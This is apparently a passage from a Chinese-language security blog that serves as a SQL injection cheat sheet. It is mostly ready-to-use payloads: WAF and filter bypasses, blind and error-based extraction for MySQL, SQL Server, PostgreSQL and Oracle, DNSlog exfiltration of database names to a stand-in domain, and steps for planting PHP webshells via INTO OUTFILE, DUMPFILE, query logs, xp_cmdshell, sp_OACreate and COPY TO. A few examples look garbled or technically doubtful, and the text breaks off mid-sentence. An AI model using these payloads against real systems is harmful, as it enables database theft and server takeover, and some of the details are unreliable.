开头。通过这种方式，可以逐字逐句地猜解数据</p></li></ul><h5 id="利用if-函数的替代品"><a href="#利用if-函数的替代品" class="headerlink" title="利用if()函数的替代品"></a>利用<code>if()</code>函数的替代品</h5><p>在布尔盲注中，<code>if()</code> 函数通常是不可或缺的。如果它和 <code>and</code> <code>or</code> 一起被过滤，那么需要寻找替代函数</p><ul><li><p><code>case when ... then ... end</code><strong>：</strong> 这是 <code>if()</code> 函数最常见的替代品，功能完全一样，且通常不会被过滤</p></li><li><p><strong>例如：</strong> <code>id=1 and (case when 1=1 then sleep(5) else 0 end)</code></p></li><li><p><strong>绕过：</strong> <code>id=1 or (case when (database() like &#39;d%&#39;) then sleep(5) else 0 end)</code></p></li><li><p><code>greatest()</code> <strong>和</strong> <code>least()</code><strong>：</strong> 这两个函数返回一组值中的最大值和最小值。我们可以利用它们来构造条件判断</p></li><li><p><strong>例如：</strong> <code>id=1 and greatest(1, (select if(1=1, 0, 1)))</code></p></li><li><p><strong>绕过：</strong> <code>id=1 or greatest(ascii(substr(database(),1,1)), 100)&gt;100</code></p></li></ul><h5 id="利用其他查询特性"><a href="#利用其他查询特性" class="headerlink" title="利用其他查询特性"></a>利用其他查询特性</h5><p>当所有常用方法都被过滤时，可以尝试利用一些非常规的查询特性<br><code>having</code> <strong>子句：</strong> <code>having</code> 用于对 <code>group by</code> 的结果进行过滤。在一些情况下，<code>having</code> 后面可以接子查询，可以利用这一点进行注入<br><code>limit offset</code><strong>：</strong> 我们可以通过 <code>limit</code> 和 <code>offset</code> 来逐行读取数据，再结合其他技术进行判断</p><h4 id="SQL注入无回显利用DNSLOG如何构造"><a href="#SQL注入无回显利用DNSLOG如何构造" class="headerlink" title="SQL注入无回显利用DNSLOG如何构造"></a>SQL注入无回显利用DNSLOG如何构造</h4><h5 id="MySQL-MariaDB"><a href="#MySQL-MariaDB" class="headerlink" title="MySQL&#x2F;MariaDB"></a>MySQL&#x2F;MariaDB</h5><h6 id="load-file"><a href="#load-file" class="headerlink" title="load_file"></a>load_file</h6><p>在 MySQL 和 MariaDB 中，<code>LOAD_FILE()</code> 函数和 <code>UNC</code> 路径（Windows 共享路径）是触发 DNS 查询的常用手段<br>LOAD_FILE()<br>用于读取文件内容，如果给一个UNC路劲，他会触发DNS查询<br>payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(CONCAT(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">SELECT</span> DATABASE()),<span class="string">&#x27;.your-dnslog.com\\a&#x27;</span>));</span><br><span class="line"></span><br><span class="line">`<span class="keyword">SELECT</span> DATABASE()`：获取当前数据库名</span><br><span class="line">    </span><br><span class="line">`CONCAT(...)`：将数据库名与你的 DNSlog 域名拼接成一个新的域名，例如 `testdb.your<span class="operator">-</span>dnslog.com`</span><br><span class="line">    </span><br><span class="line">`LOAD_FILE()`：尝试加载这个 UNC 路径，由于域名不存在本地，它会发起 DNS 查询</span><br><span class="line">    </span><br><span class="line">`\\a`：这是一个占位符，用于避免语法错误</span><br></pre></td></tr></table></figure><h6 id="dns-reverse-和benchmark"><a href="#dns-reverse-和benchmark" class="headerlink" title="dns_reverse()和benchmark()"></a>dns_reverse()和benchmark()</h6><p>需要 MySQL 5.7.10 或更高版本，且安装了 <code>sys</code> 模式</p><ul><li><p><strong>Payload 构造：</strong> <code>SELECT BENCHMARK(1000000,MD5(CONCAT(&#39;a&#39;,(SELECT DATABASE())))) AND (SELECT sys.version_get_option(&#39;version&#39;) LIKE &#39;%DNS%&#39;);</code></p></li><li><p>注意：这个方法主要是为了演示 <code>sys</code> 库的功能，实际操作中 <code>LOAD_FILE</code> 更常见</p></li></ul><h5 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h5><p>在 SQL Server 中，我们可以利用 <code>xp_cmdshell</code> 或 <code>sp_oacreate</code> 来触发 DNS 查询<br><strong>利用</strong> <code>xp_cmdshell</code><br><code>xp_cmdshell</code> 是一个强大的存储过程，可以执行系统命令。我们可以利用 <code>ping</code> 命令来触发 DNS 查询</p><ul><li><p><strong>Payload 构造：</strong> <code>EXEC xp_cmdshell &#39;ping -n 1 &#39; + (SELECT TOP 1 CAST(name AS VARCHAR(255)) FROM sys.databases) + &#39;.your-dnslog.com&#39;;</code></p></li><li><p><strong>解释：</strong></p></li><li><p><code>xp_cmdshell</code>：执行 <code>ping</code> 命令</p></li><li><p><code>SELECT TOP 1 CAST(name AS VARCHAR(255)) FROM sys.databases</code>：获取第一个数据库的名称</p></li><li><p><code>+</code>：将数据库名与你的 DNSlog 域名拼接</p></li></ul><p><strong>利用</strong> <code>sp_oacreate</code><br><code>sp_oacreate</code> 可以创建 OLE 对象，我们可以利用它来发起 HTTP 请求，从而触发 DNS 查询</p><ul><li><strong>Payload 构造：</strong> <code>DECLARE @h INT; EXEC sp_oacreate &#39;WinHttp.WinHttpRequest.5.1&#39;, @h OUT; EXEC sp_oamethod @h, &#39;Open&#39;, NULL, &#39;GET&#39;, &#39;http://&#39; + (SELECT TOP 1 CAST(name AS VARCHAR(255)) FROM sys.databases) + &#39;.your-dnslog.com&#39;;</code></li></ul><h5 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h5><p>在 PostgreSQL 中，<code>COPY</code> 命令和 <code>pg_sleep</code> 结合可以实现 DNSlog。但更直接的方法是利用 <code>pg_send_query</code> 或 <code>UDF</code>（用户定义函数）。</p><ul><li><p><strong>Payload 构造：</strong> <code>SELECT * FROM users WHERE id = 1 AND (SELECT pg_send_query(&#39;SELECT * FROM &#39; || (SELECT version()) || &#39;.your-dnslog.com&#39;)) IS NOT NULL;</code></p></li><li><p><strong>解释：</strong></p></li><li><p><code>pg_send_query()</code>：用于发送一个查询。</p></li><li><p><code>(SELECT version())</code>：获取 PostgreSQL 的版本信息。</p></li><li><p>这个方法利用了 PostgreSQL 在解析域名时会触发 DNS 查询的特性</p></li></ul><h4 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h4><p>在显示位上替换为常见的注入变量或其它语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ((<span class="keyword">select</span> <span class="number">1</span>)A <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)B <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)C）;</span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> dual <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span> <span class="keyword">from</span> dual <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">3</span> <span class="keyword">from</span> dual;</span><br><span class="line"># dual是 MySQL<span class="operator">/</span>Oracle 的虚拟表（PostgreSQL 可省略，<span class="keyword">SQL</span> Server 用sysobjects替代），用于无实际表时的 <span class="keyword">SELECT</span> 查询；</span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span> <span class="keyword">offset</span> <span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">3</span> <span class="keyword">offset</span> <span class="number">0</span>;</span><br><span class="line"># <span class="keyword">OFFSET</span>关键字（适配无dual的场景）</span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>) t1 <span class="keyword">cross</span> <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>) t2 <span class="keyword">cross</span> <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>) t3;</span><br><span class="line">#<span class="keyword">JOIN</span>（复杂但绕WAF效果好）</span><br><span class="line"> </span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ((<span class="keyword">select</span> <span class="number">1</span>)A <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)B <span class="keyword">join</span> (<span class="keyword">select</span> group_concat(<span class="keyword">user</span>(),<span class="string">&#x27; &#x27;</span>,database(),<span class="string">&#x27; &#x27;</span>,@<span class="variable">@datadir</span>))C);</span><br></pre></td></tr></table></figure><h4 id="SQL-延时盲注-sleep-被禁用怎么绕过"><a href="#SQL-延时盲注-sleep-被禁用怎么绕过" class="headerlink" title="SQL 延时盲注 sleep() 被禁用怎么绕过"></a>SQL 延时盲注 sleep() 被禁用怎么绕过</h4><p><strong>1. 利用 BENCHMARK() 函数</strong><br><code>BENCHMARK()</code> 函数是 MySQL 中一个非常有用的性能测试函数。它的作用是让一个函数重复执行多次，并返回执行时间。我们可以利用这个特性来造成可控的延时</p><ul><li><p><strong>原理:</strong> <code>BENCHMARK(count, expr)</code> 会让 <code>expr</code> 表达式执行 <code>count</code> 次。如果我们让它执行一个耗时但无害的操作，就可以造成明显的延时</p></li><li><p><strong>基本语法:</strong> <code>BENCHMARK(count, expr)</code></p></li><li><p><strong>利用方式:</strong></p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 让 MD5(<span class="string">&#x27;a&#x27;</span>) 重复执行 <span class="number">5</span>,<span class="number">000</span>,<span class="number">000</span> 次，从而造成延时   </span><br><span class="line"><span class="keyword">AND</span> IF(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>, BENCHMARK(<span class="number">5000000</span>, MD5(<span class="string">&#x27;a&#x27;</span>)), <span class="number">1</span>)   </span><br></pre></td></tr></table></figure><p><strong>解释:</strong></p><ul><li><p><code>IF(condition, true_value, false_value)</code>：这是一个条件判断语句</p></li><li><p><code>ascii(substr(database(),1,1))=115</code>：这是我们的注入条件，判断数据库名的第一个字符的 ASCII 值是否为 115（即 <code>&#39;s&#39;</code>）</p></li><li><p>如果条件为真，<code>BENCHMARK()</code> 函数被执行，导致页面延迟；如果条件为假，则立即返回 <code>1</code>，页面没有延迟</p></li></ul><p><strong>2. 利用 GET_LOCK() 函数</strong><br><code>GET_LOCK()</code> 函数是 MySQL 中的一个锁函数。它可以获取一个指定的锁，并在指定的超时时间内等待。如果锁被其他会话占用，它就会一直等待直到超时。我们可以利用这个特性来造成延时</p><ul><li><p><strong>原理:</strong> <code>GET_LOCK(str, timeout)</code> 函数尝试获取一个名为 <code>str</code> 的锁，并等待 <code>timeout</code> 秒</p></li><li><p><strong>利用方式:</strong></p></li></ul><p>`&#96;&#96;sql   # 如果条件为真，则获取一个名为 ‘a’ 的锁并等待 5 秒   AND IF(ascii(substr(database(),1,1))&#x3D;115, GET_LOCK(‘a’, 5), 1)   &#96;&#96;&#96;<br>这种方法的缺点是，如果多个请求同时执行，可能会因为锁竞争而造成不可预知的行为</p><p><strong>3. 利用 RLIKE&#x2F;REGEXP 的正则特性</strong><br>当使用 <code>RLIKE</code> 或 <code>REGEXP</code> 进行正则表达式匹配时，如果正则表达式足够复杂，并且目标字符串足够长，也会造成明显的性能消耗，从而实现延时效果</p><ul><li><p><strong>原理:</strong> 构造一个回溯（backtracking）量较大的正则表达式，让 MySQL 在匹配时消耗大量 CPU 资源</p></li><li><p><strong>利用方式:</strong></p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 构造一个高回溯的正则表达式来消耗 CPU   </span><br><span class="line"><span class="keyword">AND</span> IF(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>, (<span class="keyword">SELECT</span> concat(rpad(<span class="string">&#x27;&#x27;</span>,<span class="number">4999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="string">&#x27;&#x27;</span>,<span class="number">4999999</span>,<span class="string">&#x27;a&#x27;</span>),<span class="string">&#x27;a&#x27;</span>) RLIKE <span class="string">&#x27;(a.*)+(a.*)+&#x27;</span>), <span class="number">1</span>)   </span><br></pre></td></tr></table></figure><p><strong>解释:</strong> <code>rpad()</code> 函数用于填充字符串，使其变得很长。<code>RLIKE &#39;(a.*)+(a.*)+&#39;</code> 是一个典型的回溯型正则表达式。当字符串很长时，匹配会非常耗时</p><p><strong>4. 利用笛卡尔积</strong></p><p>通过制造一个巨大的笛卡尔积，可以使查询的执行时间大大增加</p><ul><li><p><strong>原理:</strong> 当两个大表没有关联地进行连接时，结果集的行数是两个表行数的乘积</p></li><li><p><strong>利用方式:</strong></p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 使用 information_schema.tables 来制造一个笛卡尔积   </span><br><span class="line"><span class="keyword">AND</span> IF(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>, (<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> information_schema.tables a, information_schema.columns b), <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>这种方法同样会造成明显的延迟，但查询结果可能会占用大量内存</p><h4 id="outfile被过滤怎么绕"><a href="#outfile被过滤怎么绕" class="headerlink" title="outfile被过滤怎么绕"></a>outfile被过滤怎么绕</h4><h5 id="dumpfile"><a href="#dumpfile" class="headerlink" title="dumpfile()"></a>dumpfile()</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> <span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure><h5 id="利用日志文件"><a href="#利用日志文件" class="headerlink" title="利用日志文件"></a>利用日志文件</h5><p>如果数据库开启了通用查询日志（<code>general_log</code>）或者慢查询日志（<code>slow_query_log</code>），并且你有权限修改日志路径，那么可以利用这个特性来写入 Webshell</p><ul><li><p><strong>步骤</strong>：</p></li><li><p><strong>设置日志文件路径</strong>：将 <code>general_log_file</code> 或 <code>slow_query_log_file</code> 的值修改为 Web 目录下的一个可写路径，例如 <code>/var/www/html/shell.php</code></p></li><li><p><strong>开启日志</strong>：将 <code>general_log</code> 或 <code>slow_query_log</code> 设为 <code>ON</code></p></li><li><p><strong>写入恶意代码</strong>：执行一个包含 Webshell 代码的查询，例如 <code>SELECT &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;</code>。这条查询语句会被写入到日志文件中，从而创建 Webshell</p></li></ul><p>使用+号替代空格：例如，union+select+1,2,3。<br>URL编码替代：%20（空格）、%09（水平制表符HT）、%0A（换行符LF）、%0C（换页符FF）、%0D（回车CR）、%0B（垂直制表符VT）、%A0（不间断空格NBS）。<br>使用SQL注释符&#x2F;<strong>&#x2F;替代空格，如：union&#x2F;</strong>&#x2F;select。<br>括号()替代空格：select(database())。<br>使用报错注入技巧绕过限制。</p><h2 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h2><p><strong>MySQL</strong></p><table><thead><tr><th>函数&#x2F;方法</th><th>利用原理</th><th>举例</th></tr></thead><tbody><tr><td>updatexml()</td><td>修改 XML 文档，不合法的 XPath 路径会报错并显示内容</td><td>… AND updatexml(1,concat(0x7e, (SELECT database()), 0x7e),1)</td></tr><tr><td>extractvalue()</td><td>从 XML 字符串提取值，不合法的 XPath 路径会报错并显示内容</td><td>… AND extractvalue(1, concat(0x7e, (SELECT user())))</td></tr><tr><td>floor()</td><td>结合 GROUP BY 和 rand()，制造重复键错误，将数据作为键值显示</td><td>… AND (SELECT 1 FROM (SELECT count(), concat(database(),floor(rand(0)2))x FROM information_schema.tables GROUP BY x)a)</td></tr><tr><td>name_const()</td><td>用于创建一个带名称的匿名列。当在子查询中，我们使用 <code>NAME_CONST()</code> 将查询结果作为列名，并且这个列名在子查询中已经存在时，就会引发一个“重复列名”的错误，并将查询结果显示出来</td><td>AND (SELECT 1 FROM (SELECT count(), concat(database(),floor(rand(0)2))x FROM information_schema.tables GROUP BY x)a)</td></tr><tr><td>exp()</td><td>我们可以通过 <code>~</code> 按位取反操作，将一个大的负数转换成一个巨大的正数，从而触发溢出</td><td>AND (exp(~(SELECT * FROM (SELECT database())x)))</td></tr></tbody></table><p><strong>SQL Server</strong></p><table><thead><tr><th>函数&#x2F;方法</th><th>利用原理</th><th>举例</th></tr></thead><tbody><tr><td>convert() &#x2F; cast()</td><td>强制类型转换，将非数字字符串转换为整型会报错并显示字符串内容</td><td>… AND 1&#x3D;convert(int,(SELECT db_name()))</td></tr></tbody></table><p><strong>PostgreSQL</strong></p><table><thead><tr><th>函数&#x2F;方法</th><th>利用原理</th><th>举例</th></tr></thead><tbody><tr><td>cast()</td><td>强制类型转换，将字符串转换为不兼容的数据类型时报错</td><td>… AND 1&#x3D;CAST((SELECT version()) as int)</td></tr></tbody></table><p><strong>Oracle</strong></p><table><thead><tr><th>函数&#x2F;方法</th><th>利用原理</th><th>举例</th></tr></thead><tbody><tr><td>utl_inaddr.get_host_address()</td><td>utl_inaddr.get_host_address() 会将不合法的IP地址或域名作为错误信息的一部分</td><td>… AND 1&#x3D;(SELECT utl_inaddr.get_host_address((SELECT user FROM dual)))</td></tr><tr><td>ctxsys.drithsx.sn()</td><td>在执行 ctxsys.drithsx.sn() 函数时，不合法的参数会引发错误并显示内容</td><td>… AND 1&#x3D;ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’))</td></tr><tr><td>dbms_utility.sqlcode_to_char()</td><td>这个函数用于将错误代码转换为字符。它本身不是用来报错的，但可以和其他会报错的函数结合使用</td><td>AND 1&#x3D;TO_NUMBER((SELECT ‘a’</td></tr></tbody></table><h2 id="SQL注入写shell"><a href="#SQL注入写shell" class="headerlink" title="SQL注入写shell"></a>SQL注入写shell</h2><p><strong>条件</strong><br><strong>权限</strong>：具备 <code>File</code> 权限，或者说有权限执行 <code>LOAD_FILE()</code>、<code>INTO OUTFILE</code> 或 <code>INTO DUMPFILE</code> 等文件操作函数<br><strong>目标路径可写</strong>：网站服务器上的目标路径必须是可写的，且不能被权限系统限制<br><strong>WAF 或防护软件</strong>：没有强大的 WAF (Web Application Firewall) 或其他安全软件拦截注入语句</p><p><strong>1. MySQL：</strong><code>INTO OUTFILE</code></p><p><code>INTO OUTFILE</code> 语句能够将查询结果导出到一个指定的文件中<br><strong>利用步骤：</strong><br><strong>判断权限</strong>：首先，需要判断当前数据库用户是否具有 <code>File</code> 权限。可以尝试执行以下语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND (SELECT count(*) FROM mysql.user)&gt;0--+</span></span><br></pre></td></tr></table></figure><p>如果返回正常，则可以初步判断有权限。更直接的方式是尝试利用 <code>@@basedir</code> 或 <code>@@datadir</code> 查看路径是否可写</p><ol><li><strong>获取网站绝对路径</strong>：如果不知道网站的绝对路径，可以尝试利用报错或联合查询来获取</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 利用报错获取   </span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; AND (SELECT 1 FROM (SELECT count(*), concat(@@basedir,floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--+</span></span><br></pre></td></tr></table></figure><p>或者尝试猜测一些常见的路径，例如 <code>/var/www/html/</code>、<code>C:/inetpub/wwwroot/</code> 等</p><p><strong>构造注入语句</strong>：将包含 WebShell 代码的字符串作为查询结果，然后使用 <code>INTO OUTFILE</code> 导出到目标路径</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 假设我们想写入一个名为 shell.php 的文件   </span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; UNION SELECT 1, &#x27;</span><span class="operator">&lt;</span>?php eval($_POST[cmd]);?<span class="operator">&gt;</span><span class="string">&#x27; INTO OUTFILE &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>shell.php<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><ul><li><p><code>INTO OUTFILE</code> 导出时会以行的形式输出，每行末尾会有换行符，且不能覆盖已有文件。为了解决这个问题，通常会结合十六进制编码或 <code>LOAD_FILE()</code> 来绕过</p></li><li><p>为了避免转义和换行问题，WebShell 代码通常会用十六进制进行编码</p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; UNION SELECT 1, 0x3c3f706870206576616c28245f504f53545b636d645d293b3f3e INTO OUTFILE &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>shell.php<span class="string">&#x27;--+   </span></span><br></pre></td></tr></table></figure><p><strong>2. SQL Server：</strong><code>xp_cmdshell</code><br><code>xp_cmdshell</code> 是 SQL Server 的一个扩展存储过程，它允许在数据库中执行操作系统命令。如果它被启用，攻击者就可以直接执行命令来写入 WebShell</p><h4 id="利用步骤："><a href="#利用步骤：" class="headerlink" title="利用步骤："></a><strong>利用步骤：</strong></h4><p><strong>判断</strong> <code>xp_cmdshell</code> <strong>是否启用</strong>：默认情况下，<code>xp_cmdshell</code> 是禁用的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;dir c:&#x27;</span><span class="comment">-- </span></span><br></pre></td></tr></table></figure><p>如果执行成功，说明已启用。如果没有，则需要尝试启用它</p><p><strong>启用</strong> <code>xp_cmdshell</code>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>; RECONFIGURE; <span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>; RECONFIGURE<span class="comment">--   </span></span><br></pre></td></tr></table></figure><p><strong>注意：</strong> 启用 <code>xp_cmdshell</code> 需要较高的权限（通常是 <code>sysadmin</code> 角色）</p><ol><li><strong>写入 WebShell</strong>：启用 <code>xp_cmdshell</code> 后，可以使用 <code>echo</code> 命令将 WebShell 代码写入文件</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;echo ^&lt;^?php eval($_POST[cmd])?^&gt; &gt; C:\inetpub\wwwroot\shell.asp&#x27;</span><span class="comment">--   </span></span><br></pre></td></tr></table></figure><p><code>^</code> 是为了转义特殊字符 <code>&lt;</code>、<code>&gt;</code> 等</p><p><strong>3. SQL Server：</strong><code>sp_OACreate</code></p><p>如果 <code>xp_cmdshell</code> 被禁用，攻击者还可以利用 <code>sp_OACreate</code> 等 OLE 自动化存储过程来执行命令</p><ul><li><strong>利用方式</strong>：利用 <code>sp_OACreate</code> 创建一个 <code>WScript.Shell</code> 对象，然后通过其 <code>Run</code> 方法执行命令</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">DECLARE</span> <span class="variable">@o</span> <span class="type">INT</span>; <span class="keyword">EXEC</span> sp_OACreate <span class="string">&#x27;WScript.Shell&#x27;</span>, <span class="variable">@o</span> <span class="keyword">OUT</span>; <span class="keyword">EXEC</span> sp_OAMethod <span class="variable">@o</span>, <span class="string">&#x27;Run&#x27;</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;cmd.exe /c echo ^&lt;^?php eval($_POST[cmd])?^&gt; &gt; C:\inetpub\wwwroot\shell.asp&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure><p><strong>4. PostgreSQL：</strong><code>COPY TO</code></p><p>PostgreSQL 提供了 <code>COPY TO</code> 命令，用于将表数据导出到文件中</p><p>*<em>利用方式</em><br>创建一个临时表，并将 WebShell 代码插入其中<br>利用 <code>COPY TO</code> 命令将数据导出到目标文件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;; CREATE TABLE shell (cmd text); INSERT INTO shell VALUES (&#x27;</span><span class="operator">&lt;</span>?php eval($_POST[cmd]);?<span class="operator">&gt;</span><span class="string">&#x27;); COPY shell TO &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>shell.php<span class="string">&#x27;;--</span></span><br></pre></td></tr></table></figure><p><strong>注意：</strong> 执行 <code>COPY</code> 命令需要 <code>superuser</code> 权限，且目标路径必须是数据库服务器可读写的</p><h2 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h2><p>php的<code>addslashes()</code> 或 <code>mysql_real_escape_string()</code> 等函数来对单引号进行转义</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line">&#x27;</span><br><span class="line">转义</span><br><span class="line">\&#x27;</span><br><span class="line">SQL 查询：</span><br><span class="line">SELECT * FROM users WHERE id = &#x27;1\&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">这句 SQL 语句是不合法的，因为 `\&#x27;` 被视为一个转义后的单引号，从而导致查询失败，注入被阻止</span><br></pre></td></tr></table></figure><p>是因为当后端数据库使用GBK时，我们可以用一个特殊字符来吃掉转义字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">%df</span><br><span class="line"></span><br><span class="line">输入</span><br><span class="line">id=1%df</span><br><span class="line"></span><br><span class="line">URL解码后： id=1&#x27; （这里  是 0xdf 的GBK编码，具体字符取决于浏览器）</span><br><span class="line"></span><br><span class="line">addslashes() 处理后： addslashes() 只会将单引号 &#x27; 转义成 \&#x27;。 此时，字符串变为 1%df\&#x27;</span><br><span class="line"></span><br><span class="line">在内存中，它的十六进制表示是： 31 25 64 66 5c 27</span><br></pre></td></tr></table></figure><p>MySQL 在接收到这个字符串时，会把它当作 GBK 编码进行解析。它会发现 <code>%df</code>（<code>0xdf</code>）是一个宽字节的开头，并且紧接着的 <code>\</code>（<code>0x5c</code>）恰好在GBK编码的合法范围内，可以和 <code>0xdf</code> 组成一个合法的汉字</p><ul><li><p><code>%df%5c</code> (<code>0xdf</code> 和 <code>0x5c</code>) 在GBK编码中是一个合法的汉字，例如“運”</p></li><li><p><strong>结果：</strong> <code>1%df\&#39;</code> 在数据库看来就变成了 <code>1</code> + <strong>一个汉字</strong> + <code>&#39;</code></p></li><li><p><strong>最终的 SQL 查询：</strong> <code>SELECT * FROM users WHERE id = &#39;1運&#39;&#39;</code></p></li></ul><p>此时，被转义的单引号 <code>&#39;</code> 重新获得了生命，因为它不再被认为是转义符的一部分。攻击者就可以继续使用后面的单引号进行SQL注入</p><h3 id="二次注入漏洞原理"><a href="#二次注入漏洞原理" class="headerlink" title="二次注入漏洞原理"></a>二次注入漏洞原理</h3><p>我们通过一个经典的案例来解释这个过程<br>假设有一个网站，允许用户注册并修改个人信息，其中包含用户名<br><strong>第一阶段：数据注入</strong></p><ol><li><p><strong>用户注册</strong>：注册时，应用对用户名进行了严格的过滤，阻止了单引号和一些 SQL 关键字</p></li><li><p><strong>攻击者构造恶意用户名</strong>：攻击者注册一个名为 <code>test&#39; and 1=1--</code> 的账户。由于注册时的过滤机制，攻击者无法直接注入</p></li><li><p><strong>攻击者换一种方式</strong>：攻击者注册一个名为 <code>test</code> 的账户。然后，在修改用户名的功能中，他将用户名修改为 <code>test&#39; and 